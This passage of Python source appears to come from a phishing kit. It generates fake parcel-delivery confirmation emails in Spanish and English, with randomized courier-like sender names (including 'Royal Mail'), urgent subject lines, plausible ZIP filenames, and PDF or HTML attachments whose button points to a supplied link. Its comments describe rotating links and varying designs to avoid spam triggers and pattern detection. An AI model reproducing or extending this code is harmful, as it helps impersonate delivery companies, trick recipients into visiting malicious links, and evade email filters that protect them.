            "Hola {name}, esto confirma la entrega exitosa a {email}.",
            "Hola {name}, su paquete llegó seguro a su dirección hoy.",
            "Estimado {name}, su pedido ha llegado a su destino final.",
            "Hola {name}, nos complace informarle que la entrega está completa.",
        ],
        "att_outros": [
            "Use el botón a continuación para ver los detalles completos de la entrega y el historial de seguimiento.",
            "Para información completa de seguimiento, por favor use el botón a continuación.",
            "Toque el botón a continuación para acceder a su informe de entrega completo.",
            "A continuación encontrará acceso a su línea de tiempo de seguimiento completa.",
            "Su resumen de entrega detallado está disponible a continuación.",
        ],
        "att_footers": [
            "Si tiene alguna inquietud sobre esta entrega, por favor contáctenos.",
            "Si experimenta algún problema, por favor contacte a nuestro equipo de soporte.",
            "Para cualquier pregunta sobre esta entrega, no dude en ponerse en contacto.",
            "¿Necesita ayuda? Nuestro equipo está feliz de ayudar.",
        ],
        "att_button_texts": [
            "Rastrear paquete", "Ver seguimiento", "Ver recibo", "Ver detalles",
            "Rastrear pedido", "Ver pedido", "Ver info de entrega",
            "Ver detalles del pedido", "Verificar estado", "Ver estado",
            "Continuar", "Abrir recibo", "Ver confirmación"
        ],
        "att_status_label": "Entrega confirmada",
        "att_status_value": "Paquete entregado con éxito",
        "att_recipient_label": "Destinatario",
        "att_tracking_label": "Seguimiento",
        "att_today_at": "Hoy a las",
        "att_message_to": "Este mensaje fue enviado a",
        "att_order_update": "Actualización del pedido",
        "att_your_package_arrived": "Su paquete ha llegado",
        "att_recipient_caps": "DESTINATARIO",
        "att_tracking_caps": "NÚMERO DE SEGUIMIENTO",
        "att_delivered_caps": "ENTREGADO",
        "att_today_comma": "Hoy,",
        "att_tracking_number_lbl": "Número de seguimiento",
        "att_delivered_to_lbl": "Entregado a",
        "att_time_lbl": "Hora",
        "att_title_main": "Confirmación de entrega",
        "att_title_alt": "Notificación de pedido",
    },
    # ───────────────────────────────────────────────────────────
    "UK": {  # English (United Kingdom — slightly different from USA)
        "name_prefixes": [
            "Express", "Premium", "Priority", "Standard", "Quick", "Fast", "Reliable",
            "Secure", "Trusted", "Smart", "Pro", "Plus", "Elite", "Prime", "VIP",
            "Speedy", "Rapid", "Swift", "Top", "Best", "Direct", "Local", "Global",
            "International", "National", "Regional", "Premier", "Modern",
            "Advanced", "Quality", "Superior", "Verified",
            "Official", "Certified", "Approved", "Guaranteed", "Confirmed"
        ],
        "name_core": [
            "Delivery", "Shipping", "Parcel", "Courier", "Logistics",
            "Post", "Royal Mail", "Cargo", "Order", "Tracking", "Shipment",
            "Distribution", "Dispatch", "Carrier", "Transport"
        ],
        "name_suffixes": [
            "Service", "Services", "Team", "Department", "Centre", "Hub", "Express",
            "Updates", "Alerts", "Notifications", "Notices", "Network", "Solutions",
            "Group", "Co", "Partners", "Ltd", "Pro", "Plus", "Direct", "Now",
            "Today", "24/7", "Live", "UK", "Royal"
        ],
        "subject_openers": [
            "Your parcel", "Your order", "Your delivery", "Your post",
            "The parcel", "The order", "Parcel", "Order",
            "Your item", "Your purchase"
        ],
        "subject_verbs": [
            "has been delivered", "has arrived", "was delivered", "is here",
            "has just arrived", "was just delivered", "successfully delivered",
            "was delivered today", "arrived today", "has been received",
            "is now delivered", "has been dropped off",
            "made it", "arrived safely", "has been completed",
            "delivery is complete", "delivery confirmed"
        ],
        "subject_templates": [
            "{opener} {verb}", "{opener} {verb}.", "{opener} {verb} - {note}",
            "{note}: {opener} {verb}", "{note} - {opener} {verb}",
            "{verb_short}: {opener}", "{opener} {verb} ({date})",
            "Confirmation: {opener} {verb}", "Notification: {opener} {verb}",
            "Update: {opener} {verb}", "Alert: {opener} {verb}",
            "{tracking_id} - {verb_short}"
        ],
        "subject_notes": [
            "Cheers", "View details", "Track now", "See receipt", "Check status",
            "Confirm here", "Order received", "Quick update", "Heads up",
            "Important", "Action required", "Final notice", "Latest update",
            "Delivery complete", "Successfully", "Just now", "Today",
            "Now available"
        ],
        "subject_verbs_short": [
            "Delivered", "Arrived", "Complete", "Received", "Confirmed",
            "Successful", "Done", "Final delivery", "Posted",
            "Successfully delivered", "Order received", "Parcel arrived"
        ],
        "subject_dates": ["today", "earlier today", "this afternoon", "this morning"],
        "greetings": [
            "Hello [NAME],", "Hi [NAME],", "Dear [NAME],",
            "Hi there [NAME],", "Good day [NAME],"
        ],
        "att_intros": [
            "Hello {name}, your parcel has been delivered to your address.",
            "Hi {name}, we're confirming successful delivery of your recent order.",
            "Dear {name}, your shipment has arrived at the destination address.",
            "Hi {name}, your order has been delivered as scheduled.",
            "Hello {name}, this confirms successful delivery to {email}.",
            "Hi {name}, your parcel made it safely to your address today.",
            "Dear {name}, your order has reached its final destination.",
            "Hello {name}, we're delighted to inform you that delivery is complete.",
        ],
        "att_outros": [
            "Use the button below to view full delivery details and tracking history.",
            "For complete tracking information, please use the button below.",
            "Tap the button below to access your full delivery report.",
            "Below you can find access to your full tracking timeline.",
            "Your detailed delivery summary is available below.",
        ],
        "att_footers": [
            "If you have any concerns regarding this delivery, please get in touch.",
            "Should you experience any issues, please contact our support team.",
            "For any queries about this delivery, feel free to get in touch.",
            "Need assistance? Our team is happy to help.",
        ],
        "att_button_texts": [
            "Track Parcel", "View Tracking", "View Receipt", "See Details",
            "Track Order", "View Order", "View Delivery Info", "See Order Details",
            "Check Status", "View Status", "Continue", "Open Receipt",
            "View Confirmation"
        ],
        "att_status_label": "Delivery Confirmed",
        "att_status_value": "Parcel successfully delivered",
        "att_recipient_label": "Recipient",
        "att_tracking_label": "Tracking",
        "att_today_at": "Today at",
        "att_message_to": "This message was sent to",
        "att_order_update": "Order Update",
        "att_your_package_arrived": "Your parcel has arrived",
        "att_recipient_caps": "RECIPIENT",
        "att_tracking_caps": "TRACKING NUMBER",
        "att_delivered_caps": "DELIVERED",
        "att_today_comma": "Today,",
        "att_tracking_number_lbl": "Tracking number",
        "att_delivered_to_lbl": "Delivered to",
        "att_time_lbl": "Time",
        "att_title_main": "Delivery Confirmation",
        "att_title_alt": "Order Notification",
    },
}


def _lang():
    """Get current language data"""
    return LANG_DATA.get(CURRENT_LANGUAGE, LANG_DATA["EN"])


def _set_language(lang_code):
    """Set global language (EN/FR/ES/UK)"""
    global CURRENT_LANGUAGE
    if lang_code in LANG_DATA:
        CURRENT_LANGUAGE = lang_code
        return True
    return False

# ─── NAMES BUILDING BLOCKS ──────────────────────────────────────
_NAME_PREFIXES = [
    "Express", "Premium", "Priority", "Standard", "Quick", "Fast", "Reliable",
    "Secure", "Trusted", "Smart", "Pro", "Plus", "Elite", "Prime", "VIP",
    "Speedy", "Rapid", "Swift", "Top", "Best", "Direct", "Local", "Global",
    "International", "Domestic", "National", "Regional", "Premier", "Modern",
    "Advanced", "Quality", "Superior", "Ultimate", "Exclusive", "Verified",
    "Official", "Certified", "Approved", "Guaranteed", "Confirmed"
]

_NAME_CORE = [
    "Delivery", "Shipping", "Package", "Parcel", "Courier", "Logistics",
    "Mail", "Postal", "Cargo", "Freight", "Order", "Tracking", "Shipment",
    "Distribution", "Dispatch", "Fulfillment", "Carrier", "Transport"
]

_NAME_SUFFIXES = [
    "Service", "Services", "Team", "Department", "Center", "Hub", "Express",
    "Updates", "Alerts", "Notifications", "Notices", "Network", "Solutions",
    "Group", "Co", "Partners", "Co.", "Pro", "Plus", "Direct", "Now",
    "Today", "365", "24/7", "Live", "International", "Global", "Local"
]

# ─── SUBJECTS BUILDING BLOCKS ───────────────────────────────────
_SUBJECT_OPENERS = [
    "Your package", "Your order", "Your shipment", "Your parcel", "Your delivery",
    "The package", "The order", "The shipment", "Package", "Order",
    "Your item", "Your purchase"
]

_SUBJECT_VERBS = [
    "has been delivered", "has arrived", "was delivered", "is here",
    "has just arrived", "was just delivered", "successfully delivered",
    "was delivered today", "arrived today", "has been received",
    "is now delivered", "has been dropped off", "was dropped off",
    "made it", "arrived safely", "has been completed",
    "delivery is complete", "delivery confirmed"
]

_SUBJECT_TEMPLATES = [
    "{opener} {verb}",
    "{opener} {verb}.",
    "{opener} {verb} - {note}",
    "{note}: {opener} {verb}",
    "{note} - {opener} {verb}",
    "{verb_short}: {opener}",
    "{opener} {verb} ({date})",
    "Confirmation: {opener} {verb}",
    "Notification: {opener} {verb}",
    "Update: {opener} {verb}",
    "Alert: {opener} {verb}",
    "{tracking_id} - {verb_short}"
]

_SUBJECT_NOTES = [
    "Thank you", "View details", "Track now", "See receipt", "Check status",
    "Confirm here", "Order received", "Quick update", "Heads up",
    "Important", "Action required", "Final notice", "Latest update",
    "Delivery complete", "Successfully", "Just now", "Today",
    "Now available"
]

_SUBJECT_VERBS_SHORT = [
    "Delivered", "Arrived", "Complete", "Received", "Confirmed",
    "Successful", "Done", "Finished", "Final delivery", "Shipped",
    "Successfully delivered", "Order received", "Package arrived"
]

# ─── HTML TEMPLATE BUILDING BLOCKS ──────────────────────────────
_TEMPLATE_COLOR_SCHEMES = [
    {"primary":"#2c5282","bg":"#f7fafc","text":"#2d3748","accent":"#38a169","name":"blue"},
    {"primary":"#1a8754","bg":"#f0fdf4","text":"#14532d","accent":"#16a34a","name":"green"},
    {"primary":"#1a1a1a","bg":"#fafafa","text":"#222222","accent":"#525252","name":"dark"},
    {"primary":"#ea580c","bg":"#fff7ed","text":"#7c2d12","accent":"#dc2626","name":"orange"},
    {"primary":"#7c3aed","bg":"#faf5ff","text":"#4c1d95","accent":"#a855f7","name":"purple"},
    {"primary":"#0891b2","bg":"#ecfeff","text":"#164e63","accent":"#06b6d4","name":"teal"},
    {"primary":"#db2777","bg":"#fdf2f8","text":"#831843","accent":"#ec4899","name":"pink"},
    {"primary":"#0284c7","bg":"#f0f9ff","text":"#0c4a6e","accent":"#0ea5e9","name":"sky"},
    {"primary":"#65a30d","bg":"#f7fee7","text":"#365314","accent":"#84cc16","name":"lime"},
    {"primary":"#ca8a04","bg":"#fefce8","text":"#713f12","accent":"#eab308","name":"yellow"},
    {"primary":"#475569","bg":"#f8fafc","text":"#1e293b","accent":"#64748b","name":"slate"},
    {"primary":"#9333ea","bg":"#faf5ff","text":"#581c87","accent":"#c026d3","name":"violet"},
    {"primary":"#dc2626","bg":"#fef2f2","text":"#7f1d1d","accent":"#ef4444","name":"red"},
    {"primary":"#059669","bg":"#ecfdf5","text":"#064e3b","accent":"#10b981","name":"emerald"},
    {"primary":"#4f46e5","bg":"#eef2ff","text":"#312e81","accent":"#6366f1","name":"indigo"}
]

_TEMPLATE_FONTS = [
    "-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif",
    "Arial,Helvetica,sans-serif",
    "'Helvetica Neue',Helvetica,Arial,sans-serif",
    "Verdana,Geneva,sans-serif",
    "'Trebuchet MS',Arial,sans-serif",
    "Georgia,'Times New Roman',serif",
    "'Segoe UI',Tahoma,sans-serif",
    "Tahoma,Verdana,sans-serif",
    "'Open Sans',Arial,sans-serif",
    "Roboto,Arial,sans-serif"
]

_TEMPLATE_GREETINGS = [
    "Hello [NAME],",
    "Hi [NAME],",
    "Hi there [NAME],",
    "Dear [NAME],",
    "Hello [NAME]!",
    "Hi [NAME]!",
    "Greetings [NAME],",
    "Good day [NAME],",
    "Hey [NAME],",
    "Hi [NAME]!"
]

_TEMPLATE_BODY_INTROS = [
    "Good news! Your package has been successfully delivered to your address.",
    "We're happy to let you know that your order has arrived at the delivery address.",
    "This is a quick note to confirm that your package has been delivered to your address today.",
    "We're writing to confirm that your shipment has been successfully delivered.",
    "Just a quick update to confirm that your package has reached its destination today.",
    "Your order has been delivered successfully. The handover took place earlier today.",
    "We're glad to inform you that your delivery is now complete.",
    "Your shipment has been delivered as scheduled. Everything went smoothly.",
    "Quick confirmation that your package was delivered to your address.",
    "Happy to share that your delivery completed without any issues today.",
    "Your order has reached its final destination — your address.",
    "Confirming a successful delivery of your recent order today.",
    "Your package was just dropped off at your address. Mission accomplished.",
    "Today's delivery for your recent order has been completed successfully.",
    "We're letting you know your package made it safely to your address."
]

_TEMPLATE_BODY_OUTROS = [
    "You can view full delivery details and tracking history by clicking the button below.",
    "Please find the delivery summary below and use the link to view your full tracking history.",
    "The delivery was completed without any issues. You can review the full delivery information using the button below.",
    "Below is a summary of your delivery. To see complete tracking details, simply click the button.",
    "For complete tracking history and delivery details, please use the button below.",
    "Use the button below to view full tracking and delivery information.",
    "To check the complete delivery details, please click the button below.",
    "Click below to see the full delivery summary and tracking timeline.",
    "Want to see more details? Use the button below for the full breakdown."
]

_TEMPLATE_FOOTERS = [
    "If you didn't receive your package or have any concerns, please contact us as soon as possible.",
    "Should you have questions about this delivery, please reach out to us.",
    "Need help? Please contact us if you have any concerns about this delivery.",
    "If you experience any issues with your delivery, please get in touch with us right away.",
    "Any questions or concerns about this delivery? Please get in touch.",
    "If anything looks off, please reach out and we'll take care of it.",
    "Please let us know right away if there's any issue with your delivery."
]

_TEMPLATE_THANKS = [
    "Thank you for choosing our delivery service.",
    "Thank you for choosing us.",
    "Thank you for your business.",
    "We appreciate your business.",
    "Thanks for your trust.",
    "Thanks for being with us.",
    "We value your trust in us.",
    "Thank you for trusting us with your delivery."
]

_TEMPLATE_STATUS_LABELS = [
    "Status", "Delivery Status", "Order Status", "Shipment Status",
    "Confirmation", "Delivery Confirmed", "Tracking Status", "Final Status"
]

_TEMPLATE_STATUS_VALUES = [
    "Delivered Successfully", "Successfully Delivered", "Package Delivered",
    "Delivery Completed", "Order Delivered", "Successfully Completed",
    "Delivery Confirmed", "Package Received", "Successfully Received",
    "Order Successfully Delivered", "Drop-off Complete"
]

_TEMPLATE_TIME_LABELS = [
    "Today at 2:47 PM", "Today at 11:23 AM", "Today, 3:15 PM",
    "Earlier today", "Just now", "A few minutes ago",
    "Today at 1:08 PM", "This afternoon", "Today, 10:42 AM",
    "Today at 4:30 PM", "Recently delivered", "Today at 9:15 AM"
]

_TEMPLATE_BUTTON_TEXT = [
    "Track your package", "View Tracking Details", "See Delivery Info",
    "View Details", "Track Order", "View Tracking", "See Order Details",
    "Check Tracking", "View Receipt", "See Full Details"
]


# ═══════════════════════════════════════════════════════════════
# 📎 CLEAN HTML ATTACHMENT GENERATOR
# ═══════════════════════════════════════════════════════════════
# Generates HTML attachment li:
#   ✅ Clean (mafichi spam triggers)
#   ✅ Personalized [NAME] [EMAIL]
#   ✅ Link rotation per email
#   ✅ Random design (mafichi pattern detection)
#   ✅ NO "Click Here" / "Verify Now" / etc.

# Safe button texts (mafichi spam triggers!)
_ATT_BUTTON_TEXTS = [
    "Track Package",        # ✅ Safe
    "View Tracking",        # ✅ Safe
    "View Receipt",         # ✅ Safe
    "See Details",          # ✅ Safe
    "Track Order",          # ✅ Safe
    "View Order",           # ✅ Safe
    "View Delivery Info",   # ✅ Safe
    "See Order Details",    # ✅ Safe
    "Check Status",         # ✅ Safe
    "View Status",          # ✅ Safe
    "Continue",             # ✅ Safe
    "Open Receipt",         # ✅ Safe
    "View Confirmation",    # ✅ Safe
    "See Receipt",          # ✅ Safe
]

# Email body intros (clean, professional)
_ATT_INTROS = [
    "Hello {name}, your package has been delivered to your address.",
    "Hi {name}, we're confirming successful delivery of your recent order.",
    "Dear {name}, your shipment has arrived at the destination address.",
    "Hi {name}, your order has been delivered as scheduled.",
    "Hello {name}, this confirms successful delivery to {email}.",
    "Hi {name}, your package made it safely to your address today.",
    "Dear {name}, your order has reached its final destination.",
    "Hello {name}, we're glad to inform you that delivery is complete.",
]

_ATT_OUTROS = [
    "Use the button below to view full delivery details and tracking history.",
    "For complete tracking information, please use the button below.",
    "Tap the button below to access your full delivery report.",
    "Below you can find access to your full tracking timeline.",
    "Your detailed delivery summary is available below.",
]

_ATT_FOOTERS = [
    "If you have any concerns regarding this delivery, please reach out.",
    "Should you experience any issues, please contact our support team.",
    "For any questions about this delivery, feel free to get in touch.",
    "Need assistance? Our team is happy to help.",
]


# ═══════════════════════════════════════════════════════════════
# 📦 SMART ZIP FILENAME GENERATOR
# ═══════════════════════════════════════════════════════════════
# Generate professional, legitimate-looking ZIP filenames
# li ymra a7sn deliverability mn "documents.zip" plain.

# Filename templates (per category)
_ZIP_FILENAME_TEMPLATES = {
    "EN": [
        "InvoicePack_{year}.zip",
        "DeliveryDocuments_{tracking}.zip",
        "OrderReceipts_{month}.zip",
        "ShipmentInfo_Pack.zip",
        "OrderConfirmation_{number}.zip",
        "ReceiptPack_{date}.zip",
        "Invoice_{number}_{year}.zip",
        "Delivery_Confirmation_{tracking}.zip",
        "Order_Documents_{date}.zip",
        "Shipping_Receipts_{month}_{year}.zip",
        "Tracking_Pack_{tracking}.zip",
        "Documents_{number}_{year}.zip",
    ],
    "FR": [
        "FactureColis_{year}.zip",
        "DocumentsLivraison_{tracking}.zip",
        "RecusCommande_{month}.zip",
        "InfoExpedition_Pack.zip",
        "ConfirmationCommande_{number}.zip",
        "RecuPack_{date}.zip",
        "Facture_{number}_{year}.zip",
        "Confirmation_Livraison_{tracking}.zip",
    ],
    "ES": [
        "PaqueteFacturas_{year}.zip",
        "DocumentosEntrega_{tracking}.zip",
        "RecibosOrden_{month}.zip",
        "InfoEnvio_Pack.zip",
        "ConfirmacionPedido_{number}.zip",
        "ReciboPack_{date}.zip",
        "Factura_{number}_{year}.zip",
    ],
    "UK": [
        "InvoicePack_{year}.zip",
        "DeliveryDocuments_{tracking}.zip",
        "OrderReceipts_{month}.zip",
        "ShipmentInfo_Pack.zip",
        "Royal_Delivery_{tracking}.zip",
        "Receipt_Pack_{date}.zip",
    ],
}


def _generate_smart_zip_filename(recipient_email=""):
    """
    Generate professional ZIP filename mlli ZIP kayssayft.
    
    Per email = unique random filename!
    Examples:
        InvoicePack_2024.zip
        DeliveryDocuments_TR123456.zip
        OrderReceipts_April.zip
        ShipmentInfo_Pack.zip
    """
    # Get language data
    lang = CURRENT_LANGUAGE if CURRENT_LANGUAGE in _ZIP_FILENAME_TEMPLATES else "EN"
    template = random.choice(_ZIP_FILENAME_TEMPLATES[lang])
    
    # Generate placeholders
    year = random.choice(["2023", "2024", "2025"])
    tracking = f"{random.choice(['TR','PKG','SH','OR','DLV'])}{random.randint(100000, 999999)}"
    
    # Months (multi-language)
    months_en = ["January", "February", "March", "April", "May", "June",
                 "July", "August", "September", "October", "November", "December"]
    months_fr = ["Janvier", "Février", "Mars", "Avril", "Mai", "Juin",
                 "Juillet", "Août", "Septembre", "Octobre", "Novembre", "Décembre"]
    months_es = ["Enero", "Febrero", "Marzo", "Abril", "Mayo", "Junio",
                 "Julio", "Agosto", "Septiembre", "Octubre", "Noviembre", "Diciembre"]
    
    if lang == "FR":
        month = random.choice(months_fr)
    elif lang == "ES":
        month = random.choice(months_es)
    else:
        month = random.choice(months_en)
    
    # Date format
    date_formats = [
        f"{random.randint(1,28):02d}_{random.randint(1,12):02d}_{year}",  # 15_04_2024
        f"{year}_{random.randint(1,12):02d}",  # 2024_04
        f"{month}_{year}",  # April_2024
    ]
    date = random.choice(date_formats)
    
    # Number
    number = f"{random.randint(10000, 999999)}"
    
    # Build filename
    filename = template.format(
        year=year,
        tracking=tracking,
        month=month,
        date=date,
        number=number,
    )
    
    return filename


def _generate_clean_pdf_attachment(recipient_name, recipient_email, link_url):
    """
    Generate clean PDF attachment per email.
    
    Args:
        recipient_name: First name mn email
        recipient_email: Full email address
        link_url: URL bach yredirect
    
    Returns: PDF bytes (clean, professional)
    """
    if not PDF_OK:
        # Fallback: minimal PDF mn scratch (mafichi reportlab)
        return _generate_minimal_pdf(recipient_name, recipient_email, link_url)
    
    L = _lang()
    
    # Random colors (8 schemes — same ki HTML)
    schemes = [
        {"primary":"#1e40af","accent":"#3b82f6","bg":"#eff6ff","text":"#1e3a8a"},
        {"primary":"#15803d","accent":"#22c55e","bg":"#f0fdf4","text":"#14532d"},
        {"primary":"#b45309","accent":"#f59e0b","bg":"#fffbeb","text":"#78350f"},
        {"primary":"#7c2d12","accent":"#ea580c","bg":"#fff7ed","text":"#7c2d12"},
        {"primary":"#86198f","accent":"#a21caf","bg":"#fdf4ff","text":"#581c87"},
        {"primary":"#155e75","accent":"#0891b2","bg":"#ecfeff","text":"#164e63"},
        {"primary":"#1f2937","accent":"#4b5563","bg":"#f9fafb","text":"#111827"},
        {"primary":"#9f1239","accent":"#e11d48","bg":"#fff1f2","text":"#881337"},
    ]
    c = random.choice(schemes)
    
    # Random parts mn current language
    intro = random.choice(L["att_intros"]).format(name=recipient_name, email=recipient_email)
    outro = random.choice(L["att_outros"])
    footer = random.choice(L["att_footers"])
    button_text = random.choice(L["att_button_texts"])
    
    # Localized labels
    status_label = L["att_status_label"]
    status_value = L["att_status_value"]
    recipient_label = L["att_recipient_label"]
    tracking_label = L["att_tracking_label"]
    today_at = L["att_today_at"]
    title_main = L["att_title_main"]
    
    # Random tracking number
    tracking_num = f"{random.choice(['TR','PKG','SH','OR','DLV'])}-{random.randint(100000,999999)}-{random.choice(['US','XY','EX','PR'])}"
    
    # Random delivery time
    times = ["9:15 AM", "10:42 AM", "11:23 AM", "1:08 PM", "2:47 PM", "3:15 PM", "4:30 PM"]
    delivery_time = random.choice(times)
    
    # Build PDF in memory
    buf = BytesIO()
    doc = SimpleDocTemplate(buf, pagesize=A4,
                             leftMargin=0.75*inch, rightMargin=0.75*inch,
                             topMargin=0.8*inch, bottomMargin=0.8*inch,
                             title=title_main)
    
    primary_color = HexColor(c["primary"])
    accent_color = HexColor(c["accent"])
    bg_color = HexColor(c["bg"])
    text_color = HexColor(c["text"])
    
    # Styles
    styles = getSampleStyleSheet()
    
    title_style = ParagraphStyle(
        'TitleCustom', parent=styles['Heading1'],
        fontSize=20, textColor=primary_color, spaceAfter=20,
        leading=24, fontName='Helvetica-Bold'
    )
    
    body_style = ParagraphStyle(
        'BodyCustom', parent=styles['BodyText'],
        fontSize=11, textColor=text_color, spaceAfter=12,
        leading=16, fontName='Helvetica'
    )
    
    small_style = ParagraphStyle(
        'SmallCustom', parent=styles['BodyText'],
        fontSize=9, textColor=HexColor("#6b7280"),
        leading=12, fontName='Helvetica'
    )
    
    button_style = ParagraphStyle(
        'ButtonCustom', parent=styles['BodyText'],
        fontSize=12, textColor=HexColor("#ffffff"),
        alignment=TA_CENTER, fontName='Helvetica-Bold',
        leading=16
    )
    
    link_style = ParagraphStyle(
        'LinkCustom', parent=styles['BodyText'],
        fontSize=10, textColor=primary_color,
        alignment=TA_CENTER, fontName='Helvetica',
        leading=14
    )
    
    # Build content
    elements = []
    
    # Title
    elements.append(Paragraph(title_main, title_style))
    elements.append(Spacer(1, 10))
    
    # Intro
    elements.append(Paragraph(intro, body_style))
    elements.append(Spacer(1, 16))
    
    # Status box (table m3a colored bg)
    status_data = [
        [Paragraph(f"<b>{status_label.upper()}</b>",
                   ParagraphStyle('s1', parent=body_style, fontSize=9,
                                  textColor=primary_color))],
        [Paragraph(f"<b>{status_value}</b>",
                   ParagraphStyle('s2', parent=body_style, fontSize=14,
                                  textColor=text_color))],
        [Paragraph(f"{today_at} {delivery_time}",
                   ParagraphStyle('s3', parent=body_style, fontSize=10,
                                  textColor=HexColor("#6b7280")))]
    ]
    status_table = Table(status_data, colWidths=[6*inch])
    status_table.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,-1), bg_color),
        ('LEFTPADDING', (0,0), (-1,-1), 16),
        ('RIGHTPADDING', (0,0), (-1,-1), 16),
        ('TOPPADDING', (0,0), (-1,-1), 4),
        ('BOTTOMPADDING', (0,0), (-1,-1), 4),
        ('VALIGN', (0,0), (-1,-1), 'MIDDLE'),
    ]))
    elements.append(status_table)
    elements.append(Spacer(1, 8))
    
    # Spacer between
    elements.append(Spacer(1, 8))
    
    # Recipient + Tracking info
    info_data = [
        [Paragraph(f"<b>{recipient_label}:</b>", small_style),
         Paragraph(recipient_email, body_style)],
        [Paragraph(f"<b>{tracking_label}:</b>", small_style),
         Paragraph(tracking_num, body_style)]
    ]
    info_table = Table(info_data, colWidths=[1.2*inch, 4.8*inch])
    info_table.setStyle(TableStyle([
        ('LEFTPADDING', (0,0), (-1,-1), 4),
        ('RIGHTPADDING', (0,0), (-1,-1), 4),
        ('TOPPADDING', (0,0), (-1,-1), 6),
        ('BOTTOMPADDING', (0,0), (-1,-1), 6),
        ('VALIGN', (0,0), (-1,-1), 'TOP'),
    ]))
    elements.append(info_table)
    elements.append(Spacer(1, 20))
    
    # Outro
    elements.append(Paragraph(outro, body_style))
    elements.append(Spacer(1, 20))
    
    # Button (clickable!)
    button_html = f'<a href="{link_url}"><font color="#ffffff"><b>&nbsp;&nbsp;&nbsp;&nbsp;{button_text}&nbsp;&nbsp;&nbsp;&nbsp;</b></font></a>'
    button_data = [[Paragraph(button_html, button_style)]]
    button_table = Table(button_data, colWidths=[3*inch])
    button_table.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,-1), primary_color),
        ('LEFTPADDING', (0,0), (-1,-1), 30),
        ('RIGHTPADDING', (0,0), (-1,-1), 30),
        ('TOPPADDING', (0,0), (-1,-1), 12),
        ('BOTTOMPADDING', (0,0), (-1,-1), 12),
        ('ALIGN', (0,0), (-1,-1), 'CENTER'),
    ]))
    
    # Center the button
    centered_button = Table([[button_table]], colWidths=[6*inch])
    centered_button.setStyle(TableStyle([
        ('ALIGN', (0,0), (-1,-1), 'CENTER'),
        ('LEFTPADDING', (0,0), (-1,-1), 0),
        ('RIGHTPADDING', (0,0), (-1,-1), 0),
    ]))
    elements.append(centered_button)
    elements.append(Spacer(1, 30))
    
    # Footer
    elements.append(Paragraph(footer, small_style))
    
    # Build PDF
    try:
        doc.build(elements)
        pdf_bytes = buf.getvalue()
        buf.close()
        return pdf_bytes
    except Exception as e:
        buf.close()
        return _generate_minimal_pdf(recipient_name, recipient_email, link_url)


def _generate_minimal_pdf(recipient_name, recipient_email, link_url):
    """Minimal PDF fallback ila reportlab mafichi installed.
    Generates a basic PDF mn scratch (PDF specs)"""
    L = _lang()
    intro = random.choice(L["att_intros"]).format(name=recipient_name, email=recipient_email).replace("(", "\\(").replace(")", "\\)")
    button_text = random.choice(L["att_button_texts"])
    title_main = L["att_title_main"]
    
    # Escape PDF special chars
    def esc(s):
        return s.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)")
    
    content_text = f"BT /F1 16 Tf 50 750 Td ({esc(title_main)}) Tj ET"
    content_text += f" BT /F1 11 Tf 50 700 Td ({esc(intro[:80])}) Tj ET"
    content_text += f" BT /F1 11 Tf 50 670 Td (Email: {esc(recipient_email)}) Tj ET"
    content_text += f" BT /F1 11 Tf 50 640 Td ({esc(button_text)}: {esc(link_url[:60])}) Tj ET"
    
    pdf = (
        b"%PDF-1.4\n"
        b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        b"/Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>\nendobj\n"
        b"4 0 obj\n<< /Length " + str(len(content_text)).encode() + b" >>\nstream\n"
        + content_text.encode('latin-1', errors='replace') + b"\nendstream\nendobj\n"
        b"5 0 obj\n<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>\nendobj\n"
        b"xref\n0 6\n0000000000 65535 f\n"
        b"0000000009 00000 n\n0000000058 00000 n\n0000000115 00000 n\n"
        b"0000000220 00000 n\n0000000350 00000 n\n"
        b"trailer\n<< /Size 6 /Root 1 0 R >>\nstartxref\n420\n%%EOF\n"
    )
    return pdf


def _generate_clean_html_attachment(recipient_name, recipient_email, link_url):
    """
    Generate clean HTML attachment per email.
    
    Args:
        recipient_name: First name mn email (auto-extracted)
        recipient_email: Full email address
        link_url: URL link bach yredirect (mn user's list)
    
    Returns: HTML string (clean, mafichi spam triggers)
    """
    # Random colors (8 schemes — clean professional)
    schemes = [
        {"primary":"#1e40af","accent":"#3b82f6","bg":"#eff6ff","text":"#1e3a8a"},  # Blue
        {"primary":"#15803d","accent":"#22c55e","bg":"#f0fdf4","text":"#14532d"},  # Green
        {"primary":"#b45309","accent":"#f59e0b","bg":"#fffbeb","text":"#78350f"},  # Amber
        {"primary":"#7c2d12","accent":"#ea580c","bg":"#fff7ed","text":"#7c2d12"},  # Orange
        {"primary":"#86198f","accent":"#a21caf","bg":"#fdf4ff","text":"#581c87"},  # Purple
        {"primary":"#155e75","accent":"#0891b2","bg":"#ecfeff","text":"#164e63"},  # Cyan
        {"primary":"#1f2937","accent":"#4b5563","bg":"#f9fafb","text":"#111827"},  # Slate
        {"primary":"#9f1239","accent":"#e11d48","bg":"#fff1f2","text":"#881337"},  # Rose
    ]
    c = random.choice(schemes)
    
    # Random font
    fonts = [
        "-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif",
        "Arial,Helvetica,sans-serif",
        "'Helvetica Neue',Helvetica,Arial,sans-serif",
        "Verdana,Geneva,sans-serif",
        "Georgia,'Times New Roman',serif",
    ]
    font = random.choice(fonts)
    
    # 🌍 Use current language data
    L = _lang()
    intro = random.choice(L["att_intros"]).format(name=recipient_name, email=recipient_email)
    outro = random.choice(L["att_outros"])
    footer = random.choice(L["att_footers"])
    button_text = random.choice(L["att_button_texts"])
    
    # Localized labels
    status_label = L["att_status_label"]
    status_value = L["att_status_value"]
    recipient_label = L["att_recipient_label"]
    tracking_label = L["att_tracking_label"]
    today_at = L["att_today_at"]
    message_to = L["att_message_to"]
    order_update = L["att_order_update"]
    pkg_arrived = L["att_your_package_arrived"]
    recipient_caps = L["att_recipient_caps"]
    tracking_caps = L["att_tracking_caps"]
    delivered_caps = L["att_delivered_caps"]
    today_comma = L["att_today_comma"]
    tracking_lbl = L["att_tracking_number_lbl"]
    delivered_to_lbl = L["att_delivered_to_lbl"]
    time_lbl = L["att_time_lbl"]
